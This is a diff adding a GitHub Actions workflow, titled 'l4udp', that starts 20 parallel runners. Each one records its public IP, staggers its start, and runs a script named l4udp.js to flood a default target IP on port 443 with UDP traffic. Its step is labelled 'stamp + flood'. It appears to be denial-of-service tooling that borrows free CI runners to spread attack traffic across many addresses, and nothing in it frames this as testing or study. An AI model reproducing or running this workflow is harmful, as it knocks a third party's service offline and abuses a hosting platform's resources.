@@ -1,0 +1,23 @@
+name: l4udp
+on:
+  workflow_dispatch:
+    inputs:
+      target: { default: '57.131.163.31' }
+      port: { default: '443' }
+      seconds: { default: '60' }
+      workers: { default: '4' }
+jobs:
+  l4:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    strategy:
+      fail-fast: false
+      matrix:
+        i: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - name: stamp + flood
+        run: |
+          echo "runner=${{ matrix.i }} ip=$(curl -s --max-time 8 https://api.ipify.org)"
+          sleep $(( ${{ matrix.i }} * 2 ))
+          TARGET=${{ inputs.target }} PORT=${{ inputs.port }} SEC=${{ inputs.seconds }} WORKERS=${{ inputs.workers }} node l4udp.js
